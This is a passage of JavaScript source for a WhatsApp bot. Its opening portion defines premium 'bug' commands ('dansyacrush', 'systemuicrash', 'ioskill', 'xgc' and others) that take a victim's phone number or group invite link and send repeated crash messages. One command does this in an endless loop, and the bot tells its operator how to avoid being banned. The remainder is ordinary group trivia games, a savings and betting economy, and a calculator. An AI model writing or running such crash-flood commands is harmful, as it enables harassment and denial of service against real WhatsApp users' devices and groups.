    sendMultiplePaymentInvites(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('âœ…');
  }
  break;
  case 'xandroid2':
  {
	if (!isPrem) return replyprem(mess.premium)
    if (!text){
      return replydare(`Examples of use: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replydare("The amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replydare("Please wait, "+command+" bugs are in progress..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendVariousMessages(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('âœ…');
  }
  break;
  case 'xgc':
  {
    if (!isPrem) return replyprem(mess.premium)
    if (!text) {
      return replydare("*HOW TO SEND BUG TO GRUB*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to submit bugs in bulk, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    replydare("Please wait, "+command+" bugs are in progress..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return replydare("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await Dare.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      replydare("*DONEâœ… A BUG HAS BEEN SUBMITTED TO THE GROUP!.*");
      Dare.groupLeave(groupTarget);
    } catch (error) {
      replydare(util.format(error));
    }
  } 
  break;
  case 'dansyacrush': {
  if (!isPrem) return replyprem(mess.premium)
  if (!text) return replydare(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replydare(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replydare("The amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await Dare.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "23481xxxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return replydare("The number is not registered on WhatsApp");
  }
  replydare("Please wait, "+command+" bugs are in progress..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessagesdansya(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Submitted Bug To @" + whatsappNumber.split('@')[0] + 
    " Use *" + command + "* âœ…\n\nPause for 2 minutes so the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
  case 'systemuicrash': {
  if (!isPrem) return replyprem(mess.premium)
  if (!text) return replydare(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replydare(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replydare("The amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await Dare.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "23481xxxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return replydare("The number is not registered on WhatsApp");
  }
  replydare("Please wait, "+command+" bugs are in progress..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Submitted Bug To @" + whatsappNumber.split('@')[0] + 
    " Use *" + command + "* âœ…\n\nPause for 2 minutes so the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case 'dansyavip': {
  if (!isPrem) return replyprem(mess.premium)
  if (!text) return replydare(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replydare(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replydare("The amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await Dare.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "23481xxxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return replydare("The number is not registered on WhatsApp");
  }
  replydare("Please wait, "+command+" bugs are in progress..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendRepeatedMessagesdansya(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Submitted Bug To @" + whatsappNumber.split('@')[0] + 
    " Use *" + command + "* âœ…\n\nPause for 2 minutes so the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case 'xsysui': {
  if (!isPrem) return replyprem(mess.premium)
  if (!text) return replydare(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replydare(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replydare("The amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await Dare.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "23481xxxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return replydare("The number is not registered on WhatsApp");
  }
  replydare("Please wait, "+command+" bugs are in progress..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendRepeatedMessages2(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Submitted Bug To @" + whatsappNumber.split('@')[0] + 
    " Use *" + command + "* âœ…\n\nPause for 2 minutes so the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case 'ioskill': case 'iosx': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`use it by the way .${command} 234xxxxxxx`)
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return reply(`Contoh : .${command} 234xxxxxxx`)
await reply(`In process....`)
let target = xeonyvictim + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
}
break
case 'onekill': case 'oneclickall': case 'xsamsung': case 'xwaweb': case 'doublekill': case '💀': case 'triplekill': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`use it by the way .${command} 234xxxxxxx`)
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return reply(`Example : .${command} 234xxxxxxx`)
let target = xeonyvictim + '@s.whatsapp.net'
await reply(`In process....`)
for (let j = 0; j < 1; j++) {
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
await xeonkillpic(target, oneclickxeon)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
}
await reply(`Successfully Submitted Bug To ${xeonyvictim} Using ${command}. 🙂`)
}
break
//================================================================
case 'tebakgambar':
case 'picguess': {
  if (!m.isGroup) return reply(mess.only.group)
let timeout = 60000
let id = m.chat
if (id in Dare.tebakkata) return replydare("There Are Still Unfinished Sessions!")
async function tebakgambar() {
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 return {
      img: result.img,
      Answer: result.jawaban,
      deskripsi: result.deskripsi
    }}
  let tos = await tebakgambar ()
  console.log(tos)
 let caption = `Please answer the questions above\n\nDescription : ${tos.deskripsi}\nTime : 60s\nGift : 10.000 money`
 Dare.tebakgambar[id] = [
    await Dare.sendMessage(from, {caption: caption, image: {url: tos.img}}, {quoted: m}),
    tos,
 setTimeout(() => {
	if (Dare.tebakgambar[id])
 replydare(`Time has run out\nAnswer:  ${tos.jawaban}\n\nWant to play? Type guess the picture`)
 delete Dare.tebakgambar[id]
 }, 60000)
	 ]
}
break
//==================================================================
case 'tebaklagu':
case 'songguess': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) return replydare("There Are Still Unfinished Sessions!")
 let anu = await JSON.parse(fs.readFileSync('./lib/tebaklagu.json'));
 let result = anu[Math.floor(Math.random() * anu.length)]
 let msg = await Dare.sendMessage(from, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, {quoted:m})
 Dare.sendText(from, `Is this song a song from?\n\nArtist : ${result.artist}\nTime : 60s`, msg).then(() => {
 tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Answer: " + result.jawaban)
 Dare.sendMessage(m.chat, { image: { url: 'https://i.imgur.com/XnKn6H3.jpeg' }, caption:`Time has run out\nAnswer:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lagu`},{quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
 }
}
break
case 'tebakkata':
case 'guess': {
if (!m.isGroup) return reply(mess.only.group)
  let timeout = 60000
  let id = m.chat
	if (id in Dare.tebakkata) return replydare("There Are Still Unfinished Sessions!")
 let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
 let caption = `Please answer the following questions\n\nQuestion : ${json.soal}\nTime : 60s\nGift : 10.000 money`
 Dare.tebakkata[id] = [
	await replydare(`${caption}`),
	json,
 setTimeout(() => {
 if (Dare.tebakkata[id]) 
 console.log("Answer: " + json.jawaban)
 replydare(`Time Out\nAnswer: ${json.jawaban}\n\nWant to play? Type charades`) 
 delete Dare.tebakkata[id]
 }, 60000)
 ]
}
break
//==================================================================
case 'tebakkalimat': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) return replydare("There Are Still Unfinished Sessions!")
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 Dare.sendText(from, `Please answer the following questions\n\n${result.soal}\nTime : 60s`, m).then(() => {
 tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Answer: " + result.jawaban)
 Dare.sendMessage(m.chat, { image: { url: 'https://i.imgur.com/XnKn6H3.jpeg' }, caption:`Time Out\nAnswer:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nWant to play? Type guess the sentence`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
 }
}
break
//==================================================================
case 'tebaklirik':
case 'lyricgame':{
  if (!m.isGroup) return reply(mess.only.group)
let users = global.db.users[m.sender]
	let timeout = 60000
	let poin = 10000
	let id = m.chat
	if (id in Dare.tebaklirik) return replydare('There are still unanswered questions in this chat')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	
	
	Time: *${(timeout / 1000).toFixed(2)} second*
	Bonus: ${poin} XP
	Present: ${poin} Money
	`.trim()
	Dare.tebaklirik[id] = [
	await replydare(`${caption}`),
	json, poin,
	setTimeout(() => {
	if (Dare.tebaklirik[id]) 
users.money -= 200
replydare(`*LYRIC GUESSING GAME*\n\nTime's up!\n𖦹 The answer is; *${json.jawaban}*\n𖦹 Your balance is minus 200\n𖦹 Your remaining balance: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete Dare.tebaklirik[id]
	 }, timeout)
	 ]
	}
	break
//==================================================================
case 'caklontong': {
  if (!m.isGroup) return reply(mess.only.group)
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) return replydare("There Are Still Unfinished Sessions!")
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 Dare.sendText(from, `*Answer the following questions :*\n${result.soal}*\nTime : 60s`, m).then(() => {
 caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
 })
 await sleep(60000)
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Answer: " + result.jawaban)
 Dare.sendMessage(m.chat, { image: { url: 'https://i.imgur.com/XnKn6H3.jpeg' }, caption:`Time has run out\nAnswer:  ${caklontong[m.sender.split('@')[0]]}\nDescription : ${caklontong_desk[m.sender.split('@')[0]]}\n\nWant to play? Type guess lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
 }
}
break
//==================================================================
case 'family100': {
  if (!m.isGroup) return reply(mess.only.group)
  let winScore = 10000
 let id = m.chat
	if (id in Dare.family100) return replydare('There Are Still Unfinished Sessions!')
 let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
 let hasil = `*Answer the following questions :*\n\nQuestion : ${json.soal}\n\nGift : 10.000 money\n\nThere are *${json.jawaban.length}* Answer ${json.jawaban.find(v => v.includes(' ')) ? `(some answers contain spaces)` : ''}`.trim()
 Dare.family100[id] = {
			id,
			msg: await replydare(`${hasil}`),
			...json,
			terjawab: Array.from(json.jawaban, () => false),
      winScore,  
        }
}
break
//==================================================================
case 'upvn':{
if (!DareTheCreator) return reply(`What are you doing ? This Feature is Special for My Master😜`)
function getRandomHexColor() {
  return "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0");
}
const media = await Dare.downloadAndSaveMediaMessage(quoted)
Dare.sendMessage('status@broadcast', {audio: { url: media }, mimetype: 'audio/mp3', ptt:true },{
backgroundColor: getRandomHexColor(),
statusJidList: Object.keys(db.users)
});
}
reply(`*Successfully sent WhatsApp status to people in the database*`)
break
//==================================================================
case 'tebaktebakan':
case 'riddles': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) return replydare("There Are Still Unfinished Sessions!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')
let result = anu[Math.floor(Math.random() * anu.length)]
Dare.sendText(m.chat, `Answer the following questions : *${result.soal}*?\nTime : 60s`, m).then(() => {
    tebaktebakan[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Answer: " + result.jawaban)
    Dare.sendText(m.chat, `Time has run out\nAnswer:  ${tebaktebakan[m.sender.split('@')[0]]}`, m)
    delete tebaktebakan[m.sender.split('@')[0]]
}}
break
//==================================================================
case 'tebakbendera':
case 'flagguess': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) return replydare("There Are Still Unfinished Sessions!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json')
let result = anu[Math.floor(Math.random() * anu.length)]
Dare.sendMessage(m.chat, {
    image: {
        url: result.img
    },
    caption: `Please answer the following image\n\nClue : ${result.flag}\nTime : 60s`
}, {
    quoted: m
}).then(() => {
    tebakbendera[m.sender.split('@')[0]] = result.name.toLowerCase()
})
await sleep(60000)
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Answer: " + result.name)
    Dare.sendText(m.chat, `Time has run out\nAnswer:  ${tebakbendera[m.sender.split('@')[0]]}`, m)
    delete tebakbendera[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'flagguessv2': {
  if (!m.isGroup) return reply(mess.only.group)
 if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) return replydare("There Are Still Unfinished Sessions!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json')
let result = anu[Math.floor(Math.random() * anu.length)]
Dare.sendMessage(m.chat, {
    image: {
        url: result.img
    },
    caption: `Please answer the following image\n\nClue : ${result.flag}\nTime : 60s`
}, {
    quoted: m
}).then(() => {
    tebakbendera[m.sender.split('@')[0]] = result.name.toLowerCase()
})
await sleep(60000)
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Answer: " + result.name)
    Dare.sendText(m.chat, `Time has run out\nAnswer:  ${tebakbendera[m.sender.split('@')[0]]}`, m)
    delete tebakbendera[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'tebakkabupaten':
case 'district': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) return replydare("There Are Still Unfinished Sessions!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkabupaten.json')
let result = anu[Math.floor(Math.random() * anu.length)]
Dare.sendImage(m.chat, result.url, `Please answer the following image\n\nTime : 60s`, m).then(() => {
    tebakkabupaten[m.sender.split('@')[0]] = result.title.toLowerCase()
})
await sleep(60000)
if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Answer: " + result.title)
    Dare.sendText(m.chat, `Time has run out\nAnswer:  ${tebakkabupaten[m.sender.split('@')[0]]}`, m)
    delete tebakkabupaten[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'tebakkimia':
case 'chemistry': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) return replydare("There Are Still Unfinished Sessions!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')
let result = anu[Math.floor(Math.random() * anu.length)]
Dare.sendText(m.chat, `Please answer the following questions\n\nUnsur : ${result.unsur}\nTime : 60s`, m).then(() => {
    tebakkimia[m.sender.split('@')[0]] = result.lambang.toLowerCase()
})
await sleep(60000)
if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Answer: " + result.lambang)
    Dare.sendText(m.chat, `Time has run out\nAnswer:  ${tebakkimia[m.sender.split('@')[0]]}`, m)
    delete tebakkimia[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'asahotak':
case 'teaser': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) return replydare("There Are Still Unfinished Sessions!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/asahotak.json')
let result = anu[Math.floor(Math.random() * anu.length)]
Dare.sendText(m.chat, `Please answer the following questions\n\nQuestion : ${result.soal}\nTime : 60s`, m).then(() => {
    tebakasahotak[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Answer: " + result.jawaban)
    Dare.sendText(m.chat, `Time has run out\nAnswer:  ${tebakasahotak[m.sender.split('@')[0]]}`, m)
    delete tebakasahotak[m.sender.split('@')[0]]
}}
break
//==================================================================
case 'siapaaku':
case 'whoami':{
  if (!m.isGroup) return reply(mess.only.group)
  let users = global.db.users[m.sender]
	let timeout = 60000 
	let poin = 10000
	let id = m.chat 
	if (id in Dare.siapaaku) return replydare('There are still unanswered questions in this chat')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	 
	
	Time: *${(timeout / 1000).toFixed(2)} second*
	Present: ${poin} Money
	`.trim()
	Dare.siapaaku[id] = [
	await replydare(`${caption}`),
	json, poin,
	setTimeout(() => {
	if (Dare.siapaaku[id]) 
users.money -= 200
replydare(`*GAME WHO AM I*\n\nTime's up!\n𖦹 The answer is; *${json.jawaban}*\n𖦹 Your balance is reduced by 200\n𖦹 Your remaining balance: *${db.data.users[sender].money.toLocaleString()}*`)
	delete Dare.siapaaku[id]
	 }, timeout)
	 ]
	}
	break
case "calculator":{
 val = text
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = val
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
try {
console.log(val)
let result = (new Function('return ' + val))()
if (!result) throw result
reply(`*${format}* = _${result}_`)
} catch (e) {
if (e == undefined) return reply('Isinya?')
reply('Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
}
}
break
//==================================================================
case 'susunkata':
case 'word':{
  if (!m.isGroup) return reply(mess.only.group)
	let timeout = 60000
	let poin = 10000
	let id = m.chat
	if (id in Dare.susunkata) return replydare('There are still unanswered questions in this chat')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
Tipe: ${json.tipe}
	
	Time: *${(timeout / 1000).toFixed(2)} second*
	Present: ${poin} Money
	`.trim()
	Dare.susunkata[id] = [
	await replydare(`${caption}`),
	json, poin,
	setTimeout(() => {
replydare(`*WORD COMPOSITION GAMES*\n\nTime's up!\n𖦹 The answer is; *${json.jawaban}*\n𖦹 Your balance is reduced by 200\n𖦹 Your remaining balance: *${db.data.users[sender].money.toLocaleString()}*`)
	delete Dare.susunkata[id]
	 }, timeout)
	 ]
	}
	break
//==================================================================
case 'tekateki':
case 'puzzle':{
  if (!m.isGroup) return reply(mess.only.group)
	let timeout = 60000
	let users = global.db.users[m.sender]
	let poin = 10000
	let id = m.chat
	if (id in Dare.tekateki) return replydare('There are still unanswered questions in this chat')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	
	
	Time: *${(timeout / 1000).toFixed(2)} second*
	Bonus: ${poin} XP
	Present: ${poin} Money 💸
	`.trim()
	Dare.tekateki[id] = [
	await replydare(`${caption}`),
	json, poin,
	setTimeout(() => {
	if (Dare.tekateki[id]) 
users.money -= 200
replydare(`*PUZZLE GAMES*\n\nTime's up!\n𖦹 The answer is; *${json.jawaban}*\n𖦹 Your balance is reduced by 200\n𖦹 Your remaining balance: *${db.users[sender].money.toLocaleString()}*`)
	delete Dare.tekateki[id]
	 }, timeout)
	 ]
	}
	break
//==================================================================
case 'tebakbendera2': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) return replydare("There Are Still Unfinished Sessions!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json')
let result = anu[Math.floor(Math.random() * anu.length)]
Dare.sendMessage(m.chat, {
    image: {
        url: result.img
    },
    caption: `Please answer the following image\n\nTime : 60s`
}, {
    quoted: m
}).then(() => {
    tebakbendera2[m.sender.split('@')[0]] = result.name.toLowerCase()
})
await sleep(60000)
if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Answer: " + result.name)
    Dare.sendText(m.chat, `Time has run out\nAnswer:  ${tebakbendera2[m.sender.split('@')[0]]}`, m)
    delete tebakbendera2[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'banknabung':
case 'savings': {
  if (!m.isGroup) return reply(mess.only.group)
const xpperlimit = 1
  let user = global.db.users[m.sender]
  let all = command.replace(/^tarik/i, '')
  let count = all ? all : args[0]
  count = count ? /all/i.test(count) ? Math.floor(user.money / xpperlimit) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
  count = Math.max(1, count)
  if (user.atm == 0) return replydare('You dont have an ATM card yet')
  if (user.bank > user.fullatm) return replydare('The ATM is full of money!')
  if (count > user.fullatm - user.bank) return m.reply('His money has reached the limit')
  if (user.money >= xpperlimit * count) {
    user.money -= xpperlimit * count
    user.bank += count
    replydare(`Successfully saved up to ${count} Money 🙂`)
  } else replydare(`[❗] Your money is not enough to save ${count} money 🙂`, )
}
break
//==================================================================
case 'banktarik':
case 'withdraw': {
  if (!m.isGroup) return reply(mess.only.group)
const xpperlimit = 1
  let user = global.db.users[m.sender]
  let all = command.replace(/^tarik/i, '')
  let count = all ? all : args[0]
  count = count ? /all/i.test(count) ? Math.floor(user.bank / xpperlimit) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
  count = Math.max(1, count)
  if (user.atm == 0) return replydare('You dont have an ATM card yet !')
  if (user.bank >= xpperlimit * count) {
    user.bank -= xpperlimit * count
    user.money += count
    replydare(`Success attracts as much as ${count} Money 🙂`)
  } else replydare(`[❗] The money in your bank is not sufficient to withdraw the amount ${count} money 🙂`)
}
break
//==================================================================
case 'berkebon':
case 'gardening':{
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
const timeout = 1800000
    let __timers = (new Date - global.db.users[m.sender].lastberkebon)
    let _timers = (timeout - __timers)
    let timers = clockString(_timers)
    let user = global.db.users[m.sender]
    let { stock } = global.db.settings[botNumber]
    let pisang = 100 - user.bibitpisang
    let anggur = 100 - user.bibitanggur
    let mangga = 100 - user.bibitmangga
    let jeruk = 100 - user.bibitjeruk
    let apel = 100 - user.bibitapel
    let kerja = 'Berkebun'
    let id = m.chat
    .misi = Dare.misi ? Dare.misi : {}
    if (id in Dare.misi) {
        replydare(`Complete the Mission ${Dare.misi[id][0]} Above all`)
        return false
    }
    let caption = `
📮 Kamu Membutuhkan Bibit:\n${user.bibitpisang < 100 ? `\n${global.rpg.emoticon('bibitpisang')} BananaSeeds: ${pisang}`: ''} ${user.bibitanggur < 100 ? `\n${global.rpg.emoticon('bibitanggur')} GrapeSeeds: ${anggur}`: ''} ${user.bibitmangga < 100 ? `\n${global.rpg.emoticon('bibitmangga')} MangoSeeds: ${mangga}`: ''} ${user.bibitjeruk < 100 ? `\n${global.rpg.emoticon('bibitjeruk')} OrangeSeeds: ${jeruk}`: ''} ${user.bibitapel < 100 ? `\n${global.rpg.emoticon('bibitapel')} AppleSeeds: ${apel}`: ''}`.trim()
    if (new Date - user.lastberkebon > 1800000) {
        if (user.bibitpisang >= 100 && user.bibitanggur >= 100 && user.bibitmangga >= 100 && user.bibitapel >= 100 && user.bibitjeruk >= 100) {
            let hasil1 = Math.floor(Math.random() * 100)
            let hasil2 = Math.floor(Math.random() * 100)
            let hasil3 = Math.floor(Math.random() * 100)
            let hasil4 = Math.floor(Math.random() * 100)
            let hasil5 = Math.floor(Math.random() * 100)

            let caption = `⌛ Your Harvest

${global.rpg.emoticon('Banana')} Banana: ${hasil1}
${global.rpg.emoticon('Wine')} Wine: ${hasil2}
${global.rpg.emoticon('Mango')} Mango: ${hasil3}
${global.rpg.emoticon('Orange')} Orange: ${hasil4}
${global.rpg.emoticon('Apple')} Apple: ${hasil5}
`
            user.pisang += hasil1
            user.anggur += hasil2
            user.mangga += hasil3
            user.jeruk += hasil4
            user.apel += hasil5

            user.bibitpisang -= 100
            user.bibitanggur -= 100
            user.bibitmangga -= 100
            user.bibitjeruk -= 100
            user.bibitapel -= 100

            stock.bibitpisang += 100
            stock.bibitanggur += 100
            stock.bibitmangga += 100
            stock.bibitjeruk += 100
            stock.bibitapel += 100


            Dare.misi[id] = [
kerja,
setTimeout(() => {
delete Dare.misi[id]
}, 20000)
            ]

            setTimeout(() => {
replydare(`${caption.trim()}`)
            }, 20000)

            setTimeout(() => {
replydare('Planting Seeds...')
            }, 0)
            user.lastberkebon = new Date * 1
        } else replydare(`${caption}`)
    } else replydare(`Please Wait While ${timers} To Garden Again...`)
}
break
//==================================================================
case 'bet': {
  if (!m.isGroup) return reply(mess.only.group)
  function number(x = 0) {
    x = parseInt(x)
    return !isNaN(x) && typeof x == 'number'
}
const items = [ 'money', 'chip' ]
    let user = global.db.users[m.sender]
    let item = items.filter(v => v in user && typeof user[v] == 'number')
    let type = (args[0] || '').toLowerCase()
    let count = (args[1] && number(parseInt(args[1])) ? Math.max(parseInt(args[1]), 1): /all/i.test(args[1]) ? Math.floor(parseInt(user[type])): 1) * 1
    if (!item.includes(type)) return replydare(`*List Item:*\n${item.map(v => `${global.rpg.emoticon(v)}${v}`.trim()).join('\n')}\n\nExample:\nbet money 100000`)
    if ((user[type] * 1) < count) return replydare(`*${type} ${global.rpg.emoticon(type)}* you are not enough!!`)
    let moneyDulu = user[type] * 1
    let txt = (m.msg && m.msg.selectedDisplayText ? m.msg.selectedDisplayText: m.text ? m.text: '').toLowerCase()
    try {
        let Bot = (Math.ceil(Math.random() * 91)) * 1
        let Kamu = (Math.floor(Math.random() * 71)) * 1
        let status = 'Lose'
